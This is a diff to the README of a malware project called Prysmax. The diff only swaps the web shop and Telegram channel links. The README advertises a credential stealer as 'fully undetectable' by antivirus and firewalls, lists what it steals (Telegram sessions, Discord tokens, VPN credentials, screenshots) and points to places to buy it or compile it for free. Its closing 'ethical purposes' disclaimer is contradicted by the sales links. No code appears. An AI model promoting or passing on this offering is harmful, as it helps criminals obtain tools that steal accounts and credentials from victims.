@@ -1,7 +1,7 @@
 # MAKE U OWN STEALER  !! 
 ## 📍 New Update
 telegram: https://t.me/prysmaxc2 
-web: https://prysmax.fun FUD STEALER 
+web: https://prysmax.store FUD STEALER 
 https://t.me/lawxszdev
 ####   🌟 STARR FOR MORE UPDATES ❤️ 
    - 🌟 If you want to compile your file go to the Prysmax repository and compile it for free and easy! - [Prysmax Compilator](https://github.com/Lawxsz/prysmax)
@@ -26,8 +26,8 @@ https://t.me/lawxszdev
 ![image](https://github.com/user-attachments/assets/33072cfa-3321-4117-ab69-531333349297)
 ![image](https://github.com/user-attachments/assets/e6b94cca-9bac-4aba-a745-5e94552cfff0)
 
-Web to buy: Prysmax.top
-Telegram Channel: https://t.me/prysmaxsoftware 
+Web to buy: Prysmax.store
+Telegram Channel: https://t.me/prysmaxc2 
 - ⬛ FUD (FULLY UNDETECTABLE to Firewall, and all Antivirus Softwares)
 - 🚀 Telegram Stealer 
 - 🚀 Discord Tokens
@@ -42,7 +42,7 @@ Telegram Channel: https://t.me/prysmaxsoftware
 - 📸 PC Screenshot
 - ❤️ Surfshark/ProtonVPN/NordVPN/CyberGhost/ExpressVPN/TunnelBear/VyprVPN/Windscribe/IPVanish/Hotspot Shield
 - 💸 with Fully Undetectable, bot builder , api server   @Lawxsz
-- Web to buy prysmax.fun 
+- Web to buy prysmax.store 
 
 # DISCLAIMER 📛 
 - This repository is for ethical purposes and to use the scripts to learn and improve in python :)
